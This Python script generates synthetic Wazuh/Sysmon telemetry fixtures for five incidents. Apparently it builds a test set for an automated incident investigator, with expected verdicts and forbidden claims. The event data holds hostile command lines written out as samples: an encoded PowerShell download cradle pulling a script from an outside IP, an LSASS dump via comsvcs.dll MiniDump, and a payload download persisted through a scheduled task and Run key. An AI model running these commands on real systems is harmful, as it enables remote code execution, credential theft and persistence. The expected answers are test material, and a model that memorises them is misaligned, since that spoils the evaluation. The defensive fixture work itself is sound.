"""Generate deterministic fixture telemetry for the five incidents.

Run once to (re)create the JSON under cases/. Produces Wazuh-shaped documents
(data.win.system / data.win.eventdata) so the fixtures exercise the exact
normalization path the live Wazuh backend uses.
"""

from __future__ import annotations

import base64
import json
from pathlib import Path

CASES = Path(__file__).resolve().parent / "investigator" / "cases"


def sysmon(evid, ts, host, eventdata, rule=None):
    doc = {
        "id": None,
        "timestamp": ts,
        "agent": {"id": "001", "name": host, "ip": "10.20.5.11"},
        "rule": rule or {},
        "data": {"win": {
            "system": {"providerName": "Microsoft-Windows-Sysmon", "eventID": str(evid),
                       "channel": "Microsoft-Windows-Sysmon/Operational", "computer": host},
            "eventdata": eventdata,
        }},
    }
    return doc


def security(evid, ts, host, eventdata, rule=None):
    return {
        "id": None,
        "timestamp": ts,
        "agent": {"id": "001", "name": host, "ip": "10.20.5.11"},
        "rule": rule or {},
        "data": {"win": {
            "system": {"providerName": "Microsoft-Windows-Security-Auditing", "eventID": str(evid),
                       "channel": "Security", "computer": host},
            "eventdata": eventdata,
        }},
    }


def rid(eid):
    """Assign the fixture event id (stable, human-readable)."""
    return eid


def finalize(docs):
    """Give each doc its id and drop the placeholder None."""
    for d in docs:
        assert d["id"], "every fixture doc needs an explicit id"
    return docs


def enc(cmd: str) -> str:
    return base64.b64encode(cmd.encode("utf-16-le")).decode()


def write_case(name, docs, alert, expectations, hosts):
    d = CASES / name
    d.mkdir(parents=True, exist_ok=True)
    (d / "events.json").write_text(json.dumps(finalize(docs), indent=2), encoding="utf-8")
    (d / "alert.json").write_text(json.dumps(alert, indent=2), encoding="utf-8")
    (d / "expectations.json").write_text(json.dumps(expectations, indent=2), encoding="utf-8")
    (d / "hosts.json").write_text(json.dumps(hosts, indent=2), encoding="utf-8")


# =============================================================================
# INC-001 — Suspicious PowerShell: WINWORD -> encoded powershell -> outbound
# =============================================================================
def inc001():
    host = "FIN-WKS-014"
    word_guid = "{aaaa1111-0000-0000-0001-000000000001}"
    ps_guid = "{aaaa1111-0000-0000-0001-000000000002}"
    payload = "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.44/a.ps1')"
    encoded = enc(payload)
    docs = []
    d = sysmon(1, "2026-09-29T14:02:10.000Z", host, {
        "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        "commandLine": "\"WINWORD.EXE\" /n \"C:\\Users\\jhopkins\\Downloads\\Invoice_4471.docm\"",
        "processGuid": word_guid, "processId": "5120",
        "parentImage": "C:\\Windows\\explorer.exe", "user": "CORP\\jhopkins",
        # Real Sysmon always records the parent GUID; explorer.exe started long
        # before the retained window, so its own creation event is absent.
        "parentProcessGuid": "{aaaa1111-0000-0000-0001-0000000000e0}",
    })
    d["id"] = rid("INC001-0001"); docs.append(d)
    d = sysmon(1, "2026-09-29T14:02:12.500Z", host, {
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "commandLine": f"powershell.exe -nop -w hidden -EncodedCommand {encoded}",
        "processGuid": ps_guid, "processId": "6044",
        "parentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        "parentProcessGuid": word_guid, "parentCommandLine": "\"WINWORD.EXE\" /n \"...Invoice_4471.docm\"",
        "user": "CORP\\jhopkins",
    }, rule={"id": "92052", "level": 12, "description": "Powershell with encoded and hidden window arguments"})
    d["id"] = rid("INC001-0002"); docs.append(d)
    d = sysmon(3, "2026-09-29T14:02:14.100Z", host, {
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "processGuid": ps_guid, "processId": "6044",
        "destinationIp": "185.220.101.44", "destinationPort": "443",
        "destinationHostname": "cdn-node-44.example-bad.net", "protocol": "tcp",
        "user": "CORP\\jhopkins",
    })
    d["id"] = rid("INC001-0003"); docs.append(d)
    d = sysmon(22, "2026-09-29T14:02:13.700Z", host, {
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "processGuid": ps_guid, "queryName": "cdn-node-44.example-bad.net",
        "queryResults": "185.220.101.44",
    })
    d["id"] = rid("INC001-0004"); docs.append(d)
    # A little noise: an unrelated benign process on the same host.
    d = sysmon(1, "2026-09-29T13:58:00.000Z", host, {
        "image": "C:\\Windows\\System32\\notepad.exe", "commandLine": "notepad.exe",
        "processGuid": "{aaaa1111-0000-0000-0001-00000000000f}", "processId": "3300",
        "parentImage": "C:\\Windows\\explorer.exe", "user": "CORP\\jhopkins",
    })
    d["id"] = rid("INC001-0005"); docs.append(d)
    alert = {"alert_id": "INC-001", "title": "PowerShell with encoded & hidden window arguments",
             "severity": "high", "event_ref": "INC001-0002", "status": "new"}
    expectations = {
        "description": "Malicious-document style execution: Office spawns encoded PowerShell that beacons out.",
        "required_evidence": ["powershell_execution", "winword_parent", "encoded_command", "outbound_connection"],
        "required_indicators": ["powershell", "encoded_command", "office_parent", "external_destination"],
        "acceptable_verdicts": ["suspicious", "likely_malicious"],
        "expected_attack": ["T1059.001", "T1027"],
        "forbidden_claims": ["credential_theft", "lateral_movement", "persistence"],
        "min_tool_calls": 3,
    }
    hosts = [{"host": host, "os": "Windows 11 23H2", "ip": "10.20.5.11", "role": "Finance workstation",
              "owner": "CORP\\jhopkins", "criticality": "medium", "agent_status": "active"}]
    write_case("INC001", docs, alert, expectations, hosts)


# =============================================================================
# INC-002 — Credential access: suspicious LSASS access + dump file
# =============================================================================
def inc002():
    host = "HR-WKS-002"
    rundll_guid = "{bbbb2222-0000-0000-0002-000000000002}"
    docs = []
    d = sysmon(1, "2026-09-29T09:15:00.000Z", host, {
        "image": "C:\\Windows\\System32\\cmd.exe",
        "commandLine": "cmd.exe /c rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump 700 C:\\Users\\Public\\lsass.dmp full",
        "processGuid": "{bbbb2222-0000-0000-0002-000000000001}", "processId": "4102",
        "parentProcessGuid": "{bbbb2222-0000-0000-0002-0000000000e0}",
        "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "user": "CORP\\svc-backup",
    })
    d["id"] = "INC002-0001"; docs.append(d)
    d = sysmon(1, "2026-09-29T09:15:01.000Z", host, {
        "image": "C:\\Windows\\System32\\rundll32.exe",
        "commandLine": "rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump 700 C:\\Users\\Public\\lsass.dmp full",
        "processGuid": rundll_guid, "processId": "4180",
        "parentImage": "C:\\Windows\\System32\\cmd.exe",
        "parentProcessGuid": "{bbbb2222-0000-0000-0002-000000000001}", "user": "CORP\\svc-backup",
    })
    d["id"] = "INC002-0002"; docs.append(d)
    d = sysmon(10, "2026-09-29T09:15:01.500Z", host, {
        "sourceImage": "C:\\Windows\\System32\\rundll32.exe", "sourceProcessGUID": rundll_guid,
        "sourceProcessId": "4180", "targetImage": "C:\\Windows\\System32\\lsass.exe",
        "grantedAccess": "0x1fffff", "sourceUser": "CORP\\svc-backup",
        "callTrace": "C:\\Windows\\System32\\comsvcs.dll+...",
    }, rule={"id": "92034", "level": 12, "description": "Possible LSASS memory access (credential dumping)"})
    d["id"] = "INC002-0003"; docs.append(d)
    d = sysmon(11, "2026-09-29T09:15:02.200Z", host, {
        "image": "C:\\Windows\\System32\\rundll32.exe", "processGuid": rundll_guid,
        "targetFilename": "C:\\Users\\Public\\lsass.dmp", "user": "CORP\\svc-backup",
    })
    d["id"] = "INC002-0004"; docs.append(d)
    alert = {"alert_id": "INC-002", "title": "Possible LSASS memory access (credential dumping)",
             "severity": "critical", "event_ref": "INC002-0003", "status": "new"}
    expectations = {
        "description": "comsvcs.dll MiniDump of LSASS — classic credential dumping.",
        "required_evidence": ["lsass_access", "dump_file", "rundll32_execution"],
        "required_indicators": ["lsass_target", "memory_dump_file"],
        "acceptable_verdicts": ["suspicious", "likely_malicious"],
        "expected_attack": ["T1003.001"],
        "forbidden_claims": ["lateral_movement", "data_exfiltration"],
        "min_tool_calls": 3,
    }
    hosts = [{"host": host, "os": "Windows 11 23H2", "ip": "10.20.5.22", "role": "HR workstation",
              "owner": "CORP\\mgarcia", "criticality": "high", "agent_status": "active"}]
    write_case("INC002", docs, alert, expectations, hosts)


# =============================================================================
# INC-003 — Persistence: scheduled task + Run key
# =============================================================================
def inc003():
    host = "ENG-WKS-030"
    ps_guid = "{cccc3333-0000-0000-0003-000000000001}"
    docs = []
    d = sysmon(1, "2026-09-28T22:41:00.000Z", host, {
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "commandLine": "powershell.exe -c \"iwr http://45.77.12.8/upd.exe -OutFile $env:APPDATA\\upd.exe\"",
        "processGuid": ps_guid, "processId": "7020",
        "parentProcessGuid": "{cccc3333-0000-0000-0003-0000000000e0}",
        "parentImage": "C:\\Windows\\System32\\cmd.exe", "user": "CORP\\dlee",
    })
    d["id"] = "INC003-0001"; docs.append(d)
    d = sysmon(1, "2026-09-28T22:41:05.000Z", host, {
        "image": "C:\\Windows\\System32\\schtasks.exe",
        "commandLine": "schtasks /create /tn \"UpdaterSvc\" /tr \"C:\\Users\\dlee\\AppData\\Roaming\\upd.exe\" /sc onlogon /rl highest /f",
        "processGuid": "{cccc3333-0000-0000-0003-000000000002}", "processId": "7044",
        "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "parentProcessGuid": ps_guid, "user": "CORP\\dlee",
    })
    d["id"] = "INC003-0002"; docs.append(d)
    d = security(4698, "2026-09-28T22:41:05.400Z", host, {
        "taskName": "\\UpdaterSvc", "subjectUserName": "dlee", "subjectDomainName": "CORP",
        "taskContent": "<Task><Actions><Exec><Command>C:\\Users\\dlee\\AppData\\Roaming\\upd.exe</Command></Exec></Actions></Task>",
    }, rule={"id": "92100", "level": 10, "description": "Scheduled task created"})
    d["id"] = "INC003-0003"; docs.append(d)
    d = sysmon(13, "2026-09-28T22:41:08.000Z", host, {
        "image": "C:\\Windows\\System32\\reg.exe",
        "targetObject": "HKU\\S-1-5-21-1004\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
        "details": "C:\\Users\\dlee\\AppData\\Roaming\\upd.exe", "processGuid": "{cccc3333-0000-0000-0003-000000000003}",
        "user": "CORP\\dlee",
    }, rule={"id": "92101", "level": 10, "description": "Registry Run key value set"})
    d["id"] = "INC003-0004"; docs.append(d)
    alert = {"alert_id": "INC-003", "title": "Scheduled task created for logon persistence",
             "severity": "high", "event_ref": "INC003-0003", "status": "new"}
    expectations = {
        "description": "Downloaded payload persisted via a scheduled task and a Run key.",
        "required_evidence": ["scheduled_task_creation", "run_key_modification"],
        "required_indicators": ["scheduled_task", "run_key", "user_writable_path"],
        "acceptable_verdicts": ["suspicious", "likely_malicious"],
        "expected_attack": ["T1053.005", "T1547.001"],
        "forbidden_claims": ["credential_theft", "lateral_movement"],
        "min_tool_calls": 3,
    }
    hosts = [{"host": host, "os": "Windows 11 23H2", "ip": "10.20.6.30", "role": "Engineering workstation",
              "owner": "CORP\\dlee", "criticality": "medium", "agent_status": "active"}]
    write_case("INC003", docs, alert, expectations, hosts)


# =============================================================================
# INC-004 — Authentication attack: many 4625 then a 4624 success
# =============================================================================
def inc004():
    host = "DC-01"
    docs = []
    fail_times = ["2026-09-29T03:11:{:02d}.000Z".format(s) for s in (2, 9, 15, 22, 31, 40, 48, 55)]
    for i, ts in enumerate(fail_times, 1):
        d = security(4625, ts, host, {
            "targetUserName": "administrator", "targetDomainName": "CORP",
            "ipAddress": "45.155.205.233", "ipPort": str(40000 + i), "logonType": "3",
            "status": "0xc000006d", "subStatus": "0xc000006a", "workstationName": "KALI",
        }, rule={"id": "60122", "level": 5, "description": "Logon failure - unknown user or bad password"})
        d["id"] = f"INC004-{i:04d}"; docs.append(d)
    d = security(4624, "2026-09-29T03:12:05.000Z", host, {
        "targetUserName": "administrator", "targetDomainName": "CORP",
        "ipAddress": "45.155.205.233", "logonType": "3", "authenticationPackageName": "NTLM",
        "workstationName": "KALI",
    }, rule={"id": "60106", "level": 3, "description": "Logon success"})
    d["id"] = "INC004-0009"; docs.append(d)
    # Benign context: the same admin logging in earlier from an internal host.
    d = security(4624, "2026-09-29T01:00:00.000Z", host, {
        "targetUserName": "svc-monitor", "targetDomainName": "CORP",
        "ipAddress": "10.20.5.9", "logonType": "3", "authenticationPackageName": "Kerberos",
    }, rule={"id": "60106", "level": 3, "description": "Logon success"})
    d["id"] = "INC004-0010"; docs.append(d)
    alert = {"alert_id": "INC-004", "title": "Multiple authentication failures followed by success",
             "severity": "high", "event_ref": "INC004-0009", "status": "new"}
    expectations = {
        "description": "External password-guessing against the domain admin, ending in a successful logon.",
        "required_evidence": ["multiple_failed_logons", "successful_logon", "external_source_ip"],
        "required_indicators": ["failed_logon", "successful_logon", "external_source"],
        "acceptable_verdicts": ["suspicious", "likely_malicious"],
        "expected_attack": ["T1110", "T1078"],
        "forbidden_claims": ["credential_theft", "persistence"],
        "min_tool_calls": 2,
    }
    hosts = [{"host": host, "os": "Windows Server 2022", "ip": "10.20.5.5", "role": "Domain Controller",
              "criticality": "critical", "agent_status": "active"}]
    write_case("INC004", docs, alert, expectations, hosts)


# =============================================================================
# INC-005 — BENIGN admin PowerShell (looks like INC-001 but isn't)
# =============================================================================
def inc005():
    host = "IT-ADMIN-01"
    ps_guid = "{dddd5555-0000-0000-0005-000000000001}"
    # Legit inventory script, base64 for -EncodedCommand, launched by the SCCM agent.
    payload = "Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version | ConvertTo-Json"
    encoded = enc(payload)
    docs = []
    d = sysmon(1, "2026-09-29T11:00:00.000Z", host, {
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "commandLine": f"powershell.exe -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {encoded}",
        "processGuid": ps_guid, "processId": "8100",
        "parentImage": "C:\\Program Files\\Microsoft Configuration Manager\\bin\\x64\\AgentExecutor.exe",
        # Long-running management agent: its creation event predates the window.
        "parentProcessGuid": "{dddd5555-0000-0000-0005-0000000000e0}",
        "parentCommandLine": "AgentExecutor.exe -powershell ...", "user": "NT AUTHORITY\\SYSTEM",
    }, rule={"id": "92052", "level": 12, "description": "Powershell with encoded arguments"})
    d["id"] = "INC005-0001"; docs.append(d)
    d = sysmon(3, "2026-09-29T11:00:02.000Z", host, {
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "processGuid": ps_guid, "processId": "8100",
        "destinationIp": "10.20.5.40", "destinationPort": "443",
        "destinationHostname": "sccm.corp.local", "protocol": "tcp", "user": "NT AUTHORITY\\SYSTEM",
    })
    d["id"] = "INC005-0002"; docs.append(d)
    d = sysmon(1, "2026-09-29T11:00:05.000Z", host, {
        "image": "C:\\Windows\\System32\\wbem\\WMIC.exe", "commandLine": "wmic os get caption",
        "processGuid": "{dddd5555-0000-0000-0005-000000000002}", "processId": "8140",
        "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "parentProcessGuid": ps_guid, "user": "NT AUTHORITY\\SYSTEM",
    })
    d["id"] = "INC005-0003"; docs.append(d)
    alert = {"alert_id": "INC-005", "title": "Powershell with encoded arguments (SCCM host)",
             "severity": "high", "event_ref": "INC005-0001", "status": "new"}
    expectations = {
        "description": "Legitimate SCCM inventory run. Encoded PowerShell, but SYSTEM, management-agent parent, internal destination.",
        "required_evidence": ["powershell_execution", "encoded_command", "internal_connection"],
        "required_indicators": ["powershell", "encoded_command", "management_agent_parent", "internal_destination"],
        "acceptable_verdicts": ["benign", "suspicious", "insufficient_evidence"],
        "expected_attack": [],
        "forbidden_claims": ["credential_theft", "command_and_control", "persistence", "office_child_process", "payload_download"],
        "min_tool_calls": 3,
        "notes": "Guards against 'PowerShell + encoded == malicious'. Should NOT be likely_malicious.",
    }
    hosts = [{"host": host, "os": "Windows 11 23H2", "ip": "10.20.5.40", "role": "IT admin / SCCM-managed",
              "owner": "CORP\\it-admin", "criticality": "medium", "agent_status": "active",
              "notes": "Managed by SCCM; runs scheduled inventory scripts as SYSTEM."}]
    write_case("INC005", docs, alert, expectations, hosts)


if __name__ == "__main__":
    inc001(); inc002(); inc003(); inc004(); inc005()
    print("fixtures written to", CASES)
